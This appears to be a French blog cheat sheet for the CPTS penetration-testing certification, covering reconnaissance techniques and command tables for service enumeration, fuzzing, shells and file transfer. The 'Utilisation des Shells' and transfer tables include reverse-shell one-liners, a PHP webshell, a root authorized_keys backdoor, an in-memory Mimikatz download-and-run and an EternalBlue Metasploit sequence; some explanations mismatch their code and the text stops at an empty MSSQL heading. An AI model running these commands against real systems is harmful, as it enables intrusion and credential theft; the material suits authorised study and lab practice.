---
title: "CPTS Cheat Sheet"
date: 2025-05-18 10:00:00 +0200
categories: [Cheatsheet, CPTS]
tags: [cpts, cheatsheet]
toc: true
image: /assets/images/CPTS-logo.png
---

## CPTS Cheat sheet


## Collecte d'Informations

La reconnaissance web est la première étape de toute évaluation de sécurité ou test d'intrusion. C'est similaire à l'enquête initiale d'un détective, qui recueille méticuleusement des indices et des preuves sur une cible avant de formuler un plan d'action. Dans le domaine numérique, cela se traduit par l'accumulation d'informations sur un site web ou une application web pour identifier les vulnérabilités potentielles, les erreurs de configuration de sécurité et les actifs précieux.

Les objectifs principaux de la reconnaissance web tournent autour de l'obtention d'une compréhension complète de l'empreinte numérique de la cible. Cela inclut :

- `Identification des Actifs` : La découverte de tous les domaines associés, sous-domaines et adresses IP fournit une carte de la présence en ligne de la cible.
- `Découverte d'Informations Cachées` : La reconnaissance web vise à découvrir des répertoires, des fichiers et des technologies qui ne sont pas immédiatement apparents et pourraient servir de points d'entrée pour un attaquant.
- `Analyse de la Surface d'Attaque` : En identifiant les ports ouverts, les services en cours d'exécution et les versions des logiciels, vous pouvez évaluer les vulnérabilités et les faiblesses potentielles de la cible.
- `Collecte de Renseignements` : La collecte d'informations sur les employés, les adresses e-mail et les technologies utilisées peut aider dans les attaques d'ingénierie sociale ou l'identification de vulnérabilités spécifiques associées à certains logiciels.

La reconnaissance web peut être effectuée en utilisant des techniques actives ou passives, chacune ayant ses propres avantages et inconvénients :

| Type | Description | Risque de Détection | Exemples |
|------|-------------|---------------------|-----------|
| Reconnaissance Active | Implique une interaction directe avec le système cible, comme l'envoi de sondes ou de requêtes | Plus élevé | Scan de ports, scan de vulnérabilités, cartographie réseau |
| Reconnaissance Passive | Collecte des informations sans interagir directement avec la cible, en s'appuyant sur des données publiquement disponibles | Plus faible | Requêtes sur les moteurs de recherche, recherches WHOIS, énumération DNS, analyse des archives web, réseaux sociaux |

### WHOIS

WHOIS est un protocole de requête et de réponse utilisé pour récupérer des informations sur les noms de domaine, les adresses IP et autres ressources Internet. C'est essentiellement un service d'annuaire qui détaille qui possède un domaine, quand il a été enregistré, les informations de contact, et plus encore. Dans le contexte de la reconnaissance web, les recherches WHOIS peuvent être une source précieuse d'informations, révélant potentiellement l'identité du propriétaire du site web, ses informations de contact et d'autres détails qui pourraient être utilisés pour une enquête plus approfondie ou des attaques d'ingénierie sociale.

Par exemple, si vous vouliez savoir qui possède le domaine `example.com`, vous pourriez exécuter la commande suivante dans votre terminal :

```bash
whois example.com
```

Cela retournerait une multitude d'informations, notamment le registraire, les dates d'enregistrement et d'expiration, les serveurs de noms et les informations de contact du propriétaire du domaine.

Cependant, il est important de noter que les données WHOIS peuvent être inexactes ou intentionnellement masquées, il est donc toujours sage de vérifier les informations à partir de plusieurs sources. Les services de confidentialité peuvent également masquer le véritable propriétaire d'un domaine, rendant plus difficile l'obtention d'informations précises via WHOIS.

### DNS

Le système de noms de domaine (DNS) fonctionne comme le GPS d'Internet, traduisant les noms de domaine conviviaux en adresses IP numériques que les ordinateurs utilisent pour communiquer. Comme un GPS convertit le nom d'une destination en coordonnées, le DNS assure que votre navigateur atteint le bon site web en faisant correspondre son nom avec son adresse IP. Cela élimine la nécessité de mémoriser des adresses numériques complexes, rendant la navigation web fluide et efficace.

La commande `dig` vous permet d'interroger directement les serveurs DNS, récupérant des informations spécifiques sur les noms de domaine. Par exemple, si vous voulez trouver l'adresse IP associée à `example.com`, vous pouvez exécuter la commande suivante :

```bash
dig example.com A
```

Cette commande demande à `dig` d'interroger le DNS pour l'enregistrement `A` (qui fait correspondre un nom d'hôte à une adresse IPv4) de `example.com`. La sortie inclura généralement l'adresse IP demandée, ainsi que des détails supplémentaires sur la requête et la réponse. En maîtrisant la commande `dig` et en comprenant les différents types d'enregistrements DNS, vous acquérez la capacité d'extraire des informations précieuses sur l'infrastructure et la présence en ligne d'une cible.

Les serveurs DNS stockent différents types d'enregistrements, chacun ayant un objectif spécifique :

| Type d'Enregistrement | Description |
|----------------------|-------------|
| A | Fait correspondre un nom d'hôte à une adresse IPv4 |
| AAAA | Fait correspondre un nom d'hôte à une adresse IPv6 |
| CNAME | Crée un alias pour un nom d'hôte, le pointant vers un autre nom d'hôte |
| MX | Spécifie les serveurs de messagerie responsables du traitement des e-mails pour le domaine |
| NS | Délègue une zone DNS à un serveur de noms faisant autorité spécifique |
| TXT | Stocke des informations textuelles arbitraires |
| SOA | Contient des informations administratives sur une zone DNS |

### Sous-domaines

Les sous-domaines sont essentiellement des extensions d'un nom de domaine principal, souvent utilisés pour organiser différentes sections ou services au sein d'un site web. Par exemple, une entreprise pourrait utiliser `mail.example.com` pour son serveur de messagerie ou `blog.example.com` pour son blog.

D'un point de vue de la reconnaissance, les sous-domaines sont incroyablement précieux. Ils peuvent exposer des surfaces d'attaque supplémentaires, révéler des services cachés et fournir des indices sur la structure interne du réseau d'une cible. Les sous-domaines peuvent héberger des serveurs de développement, des environnements de préproduction, ou même des applications oubliées qui n'ont pas été correctement sécurisées.

Le processus de découverte des sous-domaines est connu sous le nom d'énumération de sous-domaines. Il existe deux approches principales pour l'énumération de sous-domaines :

| Approche | Description | Exemples |
|----------|-------------|-----------|
| `Énumération Active` | Interagit directement avec les serveurs DNS de la cible ou utilise des outils pour sonder les sous-domaines | Force brute, transferts de zone DNS |
| `Énumération Passive` | Collecte des informations sur les sous-domaines sans interagir directement avec la cible, en s'appuyant sur des sources publiques | Journaux de Transparence des Certificats (CT), requêtes sur les moteurs de recherche |

L'`énumération active` peut être plus approfondie mais présente un risque de détection plus élevé. À l'inverse, l'`énumération passive` est plus discrète mais peut ne pas découvrir tous les sous-domaines. La combinaison des deux techniques peut augmenter considérablement la probabilité de découvrir une liste complète des sous-domaines associés à votre cible, élargissant votre compréhension de leur présence en ligne et des vulnérabilités potentielles.


#### Force Brute des Sous-domaines

La force brute des sous-domaines est une technique proactive utilisée dans la reconnaissance web pour découvrir des sous-domaines qui ne sont pas immédiatement apparents par des méthodes passives. Elle consiste à générer systématiquement de nombreux noms de sous-domaines potentiels et à les tester contre le serveur DNS de la cible pour voir s'ils existent. Cette approche peut révéler des sous-domaines cachés qui peuvent héberger des informations précieuses, des serveurs de développement ou des applications vulnérables.

L'un des outils les plus polyvalents pour la force brute des sous-domaines est `dnsenum`. Cet outil en ligne de commande puissant combine diverses techniques d'énumération DNS, y compris la force brute basée sur un dictionnaire, pour découvrir les sous-domaines associés à votre cible.

Pour utiliser `dnsenum` pour la force brute des sous-domaines, vous lui fournirez généralement le domaine cible et une liste de mots contenant des noms de sous-domaines potentiels. L'outil interrogera ensuite systématiquement le serveur DNS pour chaque sous-domaine potentiel et signalera ceux qui existent.

Par exemple, la commande suivante tenterait de forcer brutalement les sous-domaines de `example.com` en utilisant une liste de mots nommée `subdomains.txt` :

```bash
dnsenum example.com -f subdomains.txt
```

#### Transferts de Zone

Les transferts de zone DNS, également connus sous le nom de requêtes AXFR (Asynchronous Full Transfer), offrent une mine d'or potentielle d'informations pour la reconnaissance web. Un transfert de zone est un mécanisme de réplication des données DNS entre serveurs. Lorsqu'un transfert de zone réussit, il fournit une copie complète du fichier de zone DNS, qui contient une multitude de détails sur le domaine cible.

Ce fichier de zone liste tous les sous-domaines du domaine, leurs adresses IP associées, les configurations des serveurs de messagerie et autres enregistrements DNS. C'est comme obtenir un plan de l'infrastructure DNS de la cible pour un expert en reconnaissance.

Pour tenter un transfert de zone, vous pouvez utiliser la commande `dig` avec l'option `axfr` (transfert de zone complet). Par exemple, pour demander un transfert de zone depuis le serveur DNS `ns1.example.com` pour le domaine `example.com`, vous exécuteriez :

```bash
dig @ns1.example.com example.com axfr
```

Cependant, les transferts de zone ne sont pas toujours autorisés. De nombreux serveurs DNS sont configurés pour restreindre les transferts de zone aux serveurs secondaires autorisés uniquement. Les serveurs mal configurés, cependant, peuvent permettre des transferts de zone depuis n'importe quelle source, exposant involontairement des informations sensibles.

#### Hôtes Virtuels

L'hébergement virtuel est une technique qui permet à plusieurs sites web de partager une seule adresse IP. Chaque site web est associé à un nom d'hôte unique, qui est utilisé pour diriger les requêtes entrantes vers le bon site. Cela peut être un moyen rentable pour les organisations d'héberger plusieurs sites web sur un seul serveur, mais cela peut également créer un défi pour la reconnaissance web.

Puisque plusieurs sites web partagent la même adresse IP, un simple scan de l'IP ne révélera pas tous les sites hébergés. Vous avez besoin d'un outil qui peut tester différents noms d'hôte contre l'adresse IP pour voir lesquels répondent.

Gobuster est un outil polyvalent qui peut être utilisé pour divers types de force brute, y compris la découverte d'hôtes virtuels. Son mode `vhost` est conçu pour énumérer les hôtes virtuels en envoyant des requêtes à l'adresse IP cible avec différents noms d'hôte. Si un hôte virtuel est configuré pour un nom d'hôte spécifique, Gobuster recevra une réponse du serveur web.

Pour utiliser Gobuster pour forcer brutalement les hôtes virtuels, vous aurez besoin d'une liste de mots contenant des noms d'hôte potentiels. Voici un exemple de commande :

```bash
gobuster vhost -u http://192.0.2.1 -w hostnames.txt
```

Dans cet exemple, `-u` spécifie l'adresse IP cible, et `-w` spécifie le fichier de liste de mots. Gobuster essaiera ensuite systématiquement chaque nom d'hôte dans la liste de mots et signalera ceux qui donnent une réponse valide du serveur web.

#### Journaux de Transparence des Certificats (CT)

Les journaux de Transparence des Certificats (CT) offrent une mine d'informations sur les sous-domaines pour la reconnaissance passive. Ces journaux accessibles publiquement enregistrent les certificats SSL/TLS émis pour les domaines et leurs sous-domaines, servant de mesure de sécurité pour prévenir les certificats frauduleux. Pour la reconnaissance, ils offrent une fenêtre sur des sous-domaines potentiellement négligés.

Le site web `crt.sh` fournit une interface de recherche pour les journaux CT. Pour extraire efficacement les sous-domaines en utilisant `crt.sh` dans votre terminal, vous pouvez utiliser une commande comme celle-ci :

```bash
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

Cette commande récupère les données au format JSON de `crt.sh` pour `example.com` (le `%` est un caractère générique), extrait les noms de domaine en utilisant `jq`, supprime tous les préfixes génériques (`*.`) avec `sed`, et trie et déduplique finalement les résultats.

### Exploration Web

L'exploration web est l'exploration automatisée de la structure d'un site web. Un explorateur web, ou araignée, navigue systématiquement à travers les pages web en suivant les liens, imitant le comportement de navigation d'un utilisateur. Ce processus cartographie l'architecture du site et recueille des informations précieuses intégrées dans les pages.

Un fichier crucial qui guide les explorateurs web est `robots.txt`. Ce fichier réside dans le répertoire racine d'un site web et dicte quelles zones sont interdites aux explorateurs. L'analyse de `robots.txt` peut révéler des répertoires cachés ou des zones sensibles que le propriétaire du site ne souhaite pas voir indexées par les moteurs de recherche.

`Scrapy` est un framework Python puissant et efficace pour les projets d'exploration et de scraping web à grande échelle. Il fournit une approche structurée pour définir les règles d'exploration, extraire les données et gérer divers formats de sortie.

Voici un exemple basique d'araignée Scrapy pour extraire les liens de `example.com` :

```python
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)
```

Après avoir exécuté l'araignée Scrapy, vous aurez un fichier contenant les données extraites (par exemple, `example_data.json`). Vous pouvez analyser ces résultats en utilisant des outils en ligne de commande standard. Par exemple, pour extraire tous les liens :

```bash
jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

Cette commande utilise `jq` pour extraire les liens, `awk` pour isoler les extensions de fichiers, `sort` pour les ordonner, et `uniq -c` pour compter leurs occurrences. En examinant attentivement les données extraites, vous pouvez identifier des motifs, des anomalies ou des fichiers sensibles qui pourraient être intéressants pour une enquête plus approfondie.

### Découverte par Moteurs de Recherche

L'utilisation des moteurs de recherche pour la reconnaissance implique d'exploiter leurs vastes index de contenu web pour découvrir des informations sur votre cible. Cette technique passive, souvent appelée collecte de renseignements en source ouverte (OSINT), peut fournir des informations précieuses sans interagir directement avec les systèmes de la cible.

En utilisant des opérateurs de recherche avancés et des requêtes spécialisées connues sous le nom de "Google Dorks", vous pouvez localiser des informations spécifiques enfouies dans les résultats de recherche. Voici un tableau de quelques opérateurs de recherche utiles pour la reconnaissance web :

| Opérateur | Description | Exemple |
|-----------|-------------|---------|
| `site:` | Restreint les résultats de recherche à un site web spécifique | `site:example.com "réinitialisation de mot de passe"` |
| `inurl:` | Recherche un terme spécifique dans l'URL d'une page | `inurl:admin login` |
| `filetype:` | Limite les résultats aux fichiers d'un type spécifique | `filetype:pdf "rapport confidentiel"` |
| `intitle:` | Recherche un terme dans le titre d'une page | `intitle:"index of" /backup` |
| `cache:` | Affiche la version en cache d'une page web | `cache:example.com` |
| `"terme de recherche"` | Recherche l'expression exacte entre guillemets | `"erreur interne" site:example.com` |
| `OR` | Combine plusieurs termes de recherche | `inurl:admin OR inurl:login` |
| `-` | Exclut des termes spécifiques des résultats de recherche | `inurl:admin -intext:wordpress` |

En combinant créativement ces opérateurs et en élaborant des requêtes ciblées, vous pouvez découvrir des documents sensibles, des répertoires exposés, des pages de connexion et d'autres informations précieuses qui peuvent aider dans vos efforts de reconnaissance.

### Archives Web

Les archives web sont des dépôts numériques qui stockent des instantanés de sites web à travers le temps, fournissant un historique de leur évolution. Parmi ces archives, la Wayback Machine est la ressource la plus complète et accessible pour la reconnaissance web.

La Wayback Machine, un projet de l'Internet Archive, archive le web depuis plus de deux décennies, capturant des milliards de pages web du monde entier. Cette collection massive de données historiques peut être une ressource inestimable pour les chercheurs en sécurité et les enquêteurs.

| Fonctionnalité | Description | Cas d'Utilisation en Reconnaissance |
|----------------|-------------|-------------------------------------|
| `Instantanés Historiques` | Visualiser les versions passées des sites web, y compris les pages, le contenu et les changements de design | Identifier le contenu ou les fonctionnalités passées du site web qui ne sont plus disponibles |
| `Répertoires Cachés` | Explorer les répertoires et fichiers qui ont pu être supprimés ou cachés de la version actuelle du site web | Découvrir des informations sensibles ou des sauvegardes qui ont été involontairement laissées accessibles dans les versions précédentes |
| `Changements de Contenu` | Suivre les changements dans le contenu du site web, y compris le texte, les images et les liens | Identifier les modèles dans les mises à jour de contenu et évaluer l'évolution de la posture de sécurité d'un site web |

En exploitant la Wayback Machine, vous pouvez obtenir une perspective historique sur la présence en ligne de votre cible, révélant potentiellement des vulnérabilités qui ont pu être négligées dans la version actuelle du site web.


### Outils de Base

| **Commande** | **Description** |
| ------------ | --------------- |
| **Général** | |
| `sudo openvpn user.ovpn` | Se connecter au VPN |
| `ifconfig` ou `ip a` | Afficher notre adresse IP |
| `netstat -rn` | Afficher les réseaux accessibles via le VPN |
| `ssh user@10.10.10.10` | Se connecter en SSH à un serveur distant |
| `ftp 10.129.42.253` | Se connecter en FTP à un serveur distant |
| **tmux** | |
| `tmux` | Démarrer tmux |
| `Ctrl+b` | tmux: préfixe par défaut |
| `prefix c` | tmux: nouvelle fenêtre |
| `prefix 1` | tmux: basculer vers la fenêtre (`1`) |
| `prefix shift+%` | tmux: diviser le panneau verticalement |
| `prefix shift+"` | tmux: diviser le panneau horizontalement |
| `prefix ->` | tmux: basculer vers le panneau de droite |
| **Vim** | |
| `vim file` | vim: ouvrir `file` avec vim |
| `Esc+i` | vim: entrer en mode `insert` |
| `Esc` | vim: revenir en mode `normal` |
| `x` | vim: Couper un caractère |
| `dw` | vim: Couper un mot |
| `dd` | vim: Couper une ligne entière |
| `yw` | vim: Copier un mot |
| `yy` | vim: Copier une ligne entière |
| `p` | vim: Coller |
| `:1` | vim: Aller à la ligne numéro 1 |
| `:w` | vim: Écrire le fichier (sauvegarder) |
| `:q` | vim: Quitter |
| `:q!` | vim: Quitter sans sauvegarder |
| `:wq` | vim: Écrire et quitter |

### Pentesting

| **Commande** | **Description** |
| ------------ | --------------- |
| **Analyse de Services** | |
| `nmap 10.129.42.253` | Exécuter nmap sur une IP |
| `nmap -sV -sC -p- 10.129.42.253` | Exécuter un scan de scripts nmap sur une IP |
| `locate scripts/citrix` | Lister les différents scripts nmap disponibles |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Exécuter un script nmap sur une IP |
| `netcat 10.10.10.10 22` | Récupérer la bannière d'un port ouvert |
| `smbclient -N -L \\\\10.129.42.253` | Lister les partages SMB |
| `smbclient \\\\10.129.42.253\\users` | Se connecter à un partage SMB |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scanner SNMP sur une IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Force brute de la chaîne secrète SNMP |
| **Énumération Web** | |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Exécuter un scan de répertoires sur un site web |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Exécuter un scan de sous-domaines sur un site web |
| `curl -IL https://www.inlanefreight.com` | Récupérer la bannière du site web |
| `whatweb 10.10.10.121` | Lister les détails sur le serveur web/certificats |
| `curl 10.10.10.121/robots.txt` | Lister les répertoires potentiels dans `robots.txt` |
| `Ctrl+U` | Voir le code source de la page (dans Firefox) |
| **Exploits Publics** | |
| `searchsploit openssh 7.2` | Rechercher des exploits publics pour une application web |
| `msfconsole` | MSF: Démarrer le Metasploit Framework |
| `search exploit eternalblue` | MSF: Rechercher des exploits publics dans MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Commencer à utiliser un module MSF |
| `show options` | MSF: Afficher les options requises pour un module MSF |
| `set RHOSTS 10.10.10.40` | MSF: Définir une valeur pour une option de module MSF |
| `check` | MSF: Tester si le serveur cible est vulnérable |
| `exploit` | MSF: Exécuter l'exploit sur le serveur cible |
| **Utilisation des Shells** | |
| `nc -lvnp 1234` | Démarrer un écouteur `nc` sur un port local |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Envoyer un shell inverse depuis le serveur distant |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Autre commande pour envoyer un shell inverse |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Démarrer un shell lié sur le serveur distant |
| `nc 10.10.10.1 1234` | Se connecter à un shell lié démarré sur le serveur distant |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Améliorer le shell TTY (1) |
| `Ctrl+Z` puis `stty raw -echo` puis `fg` puis `Entrée` deux fois | Améliorer le shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Créer un fichier webshell php |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Exécuter une commande sur un webshell uploadé |
| **Élévation de Privilèges** | |
| `./linpeas.sh` | Exécuter le script `linpeas` pour énumérer le serveur distant |
| `sudo -l` | Lister les privilèges `sudo` disponibles |
| `sudo -u user /bin/echo Hello World!` | Exécuter une commande avec `sudo` |
| `sudo su -` | Passer à l'utilisateur root (si nous avons accès à `sudo su`) |
| `sudo su user -` | Passer à un utilisateur (si nous avons accès à `sudo su`) |
| `ssh-keygen -f key` | Créer une nouvelle clé SSH |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Ajouter la clé publique générée à l'utilisateur |
| `ssh root@10.10.10.10 -i key` | Se connecter en SSH au serveur avec la clé privée générée |
| **Transfert de Fichiers** | |
| `python3 -m http.server 8000` | Démarrer un serveur web local |
| `wget http://10.10.14.1:8000/linpeas.sh` | Télécharger un fichier sur le serveur distant depuis notre machine locale |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Télécharger un fichier sur le serveur distant depuis notre machine locale |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transférer un fichier au serveur distant avec `scp` (nécessite un accès SSH) |
| `base64 shell -w 0` | Convertir un fichier en `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convertir un fichier de `base64` vers son format original |
| `md5sum shell` | Vérifier le `md5sum` du fichier pour s'assurer qu'il a été converti correctement |


## Techniques de Transfert de Fichiers

| **Commande** | **Description** |
|-------------|-----------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Télécharger un fichier avec PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')` | Exécuter un fichier en mémoire avec PowerShell |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Téléverser un fichier avec PowerShell |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Télécharger un fichier avec Bitsadmin |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Télécharger un fichier avec Certutil |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Télécharger un fichier avec Wget |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Télécharger un fichier avec cURL |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Télécharger un fichier avec PHP |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Téléverser un fichier avec SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Télécharger un fichier avec SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest avec un User Agent Chrome |

## Fuzzing avec Ffuf

| **Commande** | **Description** |
|-------------|-----------------|
| `ffuf -h` | Aide de ffuf |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ` | Fuzzing de répertoires |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ` | Fuzzing d'extensions |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php` | Fuzzing de pages |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v` | Fuzzing récursif |
| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/` | Fuzzing de sous-domaines |
| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx` | Fuzzing d'hôtes virtuels |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx` | Fuzzing de paramètres - GET |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Fuzzing de paramètres - POST |
| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Fuzzing de valeurs |

### Wordlists

| **Commande** | **Description** |
|-------------|-----------------|
| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt` | Directory/Page Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt` | Extensions Wordlist |
| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt` | Domain Wordlist |
| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt` | Parameters Wordlist |

### Divers

| **Commande** | **Description** |
|-------------|-----------------|
| `sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'` | Ajouter une entrée DNS |
| `for i in $(seq 1 1000); do echo $i >> ids.txt; done` | Créer une liste de mots séquentielle |
| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl avec POST |



## Énumération basée sur l'Infrastructure

| **Commande** | **Description** |
| ------------ | --------------- |
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Transparence des certificats |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scanner chaque adresse IP d'une liste avec Shodan |

### Énumération basée sur l'Hôte

##### FTP

| **Commande** | **Description** |
| ------------ | --------------- |
| `ftp <FQDN/IP>` | Interagir avec le service FTP sur la cible |
| `nc -nv <FQDN/IP> 21` | Interagir avec le service FTP sur la cible |
| `telnet <FQDN/IP> 21` | Interagir avec le service FTP sur la cible |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interagir avec le service FTP sur la cible en utilisant une connexion chiffrée |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Télécharger tous les fichiers disponibles sur le serveur FTP cible |

##### SMB

| **Commande** | **Description** |
| ------------ | --------------- |
| `smbclient -N -L //<FQDN/IP>` | Authentification par session nulle sur SMB |
| `smbclient //<FQDN/IP>/<share>` | Se connecter à un partage SMB spécifique |
| `rpcclient -U "" <FQDN/IP>` | Interaction avec la cible en utilisant RPC |
| `samrdump.py <FQDN/IP>` | Énumération des noms d'utilisateur avec les scripts Impacket |
| `smbmap -H <FQDN/IP>` | Énumération des partages SMB |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Énumération des partages SMB en utilisant une authentification par session nulle |
| `enum4linux-ng.py <FQDN/IP> -A` | Énumération SMB avec enum4linux |

##### NFS

| **Commande** | **Description** |
| ------------ | --------------- |
| `showmount -e <FQDN/IP>` | Afficher les partages NFS disponibles |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Monter le partage NFS spécifique |
| `umount ./target-NFS` | Démonter le partage NFS spécifique |

##### DNS

| **Commande** | **Description** |
| ------------ | --------------- |
| `dig ns <domain.tld> @<nameserver>` | Requête NS vers le serveur de noms spécifique |
| `dig any <domain.tld> @<nameserver>` | Requête ANY vers le serveur de noms spécifique |
| `dig axfr <domain.tld> @<nameserver>` | Requête AXFR vers le serveur de noms spécifique |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Force brute des sous-domaines |

##### SMTP

| **Commande** | **Description** |
| ------------ | --------------- |
| `telnet <FQDN/IP> 25` | Se connecter au service SMTP |
| `sudo nmap $ip -sC -sV -p25` | Énumérer le service SMTP |
| `for user in $(cat users.txt); do echo VRFY $user \| nc -nv -w 6 $ip 25  ; done` | Énumérer les utilisateurs |

##### IMAP/POP3

| **Commande** | **Description** |
| ------------ | --------------- |
| `openssl s_client -connect <FQDN/IP>:imaps` | Se connecter au service IMAPS |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Se connecter au service POP3S |

Une fois la connexion établie, voici les commandes IMAP et POP3 :

```bash
############
Commandes IMAP
############
# Connexion utilisateur
a LOGIN nom_utilisateur mot_de_passe

# Liste tous les répertoires
a LIST "" *

# Crée une boîte mail avec un nom spécifique
a CREATE "INBOX" 

# Supprime une boîte mail
a DELETE "INBOX" 

# Renomme une boîte mail
a RENAME "ÀLire" "Important"

# Retourne un sous-ensemble de noms parmi ceux que l'utilisateur a déclarés comme actifs ou abonnés
a LSUB "" *

# Sélectionne une boîte mail pour accéder aux messages
a SELECT INBOX

# Quitte la boîte mail sélectionnée
a UNSELECT INBOX

# Récupère les données (parties du message) associées à un message dans la boîte mail
a FETCH <ID> all
# Pour récupérer le corps du message :
a FETCH <ID> BODY.PEEK[TEXT]

# Supprime tous les messages marqués avec le drapeau 'Deleted'
a CLOSE

# Ferme la connexion avec le serveur IMAP
a LOGOUT
```

```bash
############
Commandes POP3
############

# Identifie l'utilisateur
USER nom_utilisateur

# Authentification de l'utilisateur avec son mot de passe
PASS mot_de_passe

# Demande au serveur le nombre d'emails sauvegardés
STAT

# Demande au serveur le nombre et la taille de tous les emails
LIST 

# Demande au serveur de délivrer l'email demandé par son ID
RETR id

# Demande au serveur de supprimer l'email demandé par son ID
DELE id

# Demande au serveur d'afficher ses capacités
CAPA

# Demande au serveur de réinitialiser les informations transmises
RSET

# Ferme la connexion avec le serveur POP3
QUIT
```


**Command**                                               | **Description**                                                                                    |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| sudo nmap $ip -sV -p110,143,993,995 -sC`                  | Footprinting the service                                                                           |
| `curl -v -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. -v is the verbose option to see how the connection is made |

After connection is established, see the IMAP and POP3 commands:

##### SNMP

| **Commande** | **Description** |
| ------------ | --------------- |
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Interroger les OIDs avec snmpwalk |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Force brute des chaînes de communauté du service SNMP |
| `braa <community string>@<FQDN/IP>:.1.*` | Force brute des OIDs du service SNMP |

#### SQL

| **Commande** | **Description** |
| ------------ | --------------- |
| `sudo nmap $ip -sV -sC -p3306 --script mysql*` | Analyse du service |
| `sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip` | Exécuter le script pour vérifier les mots de passe vides |

##### MySQL

| **Commande** | **Description** |
| ------------ | --------------- |
| `mysql -u <user> -p<password> -h <IP address>` | Se connecter au serveur MySQL. Il ne doit **pas** y avoir d'espace entre le drapeau '-p' et le mot de passe |
| `show databases;` | Afficher toutes les bases de données |
| `use <database>;` | Sélectionner une des bases de données existantes |
| `show tables;` | Afficher toutes les tables disponibles dans la base de données sélectionnée |
| `show columns from <table>;` | Afficher toutes les colonnes dans la base de données sélectionnée |
| `select * from <table>;` | Afficher tout le contenu de la table souhaitée |
| `select * from <table> where <column> = "<string>";` | Rechercher une `chaîne` spécifique dans la table souhaitée |

##### MSSQL

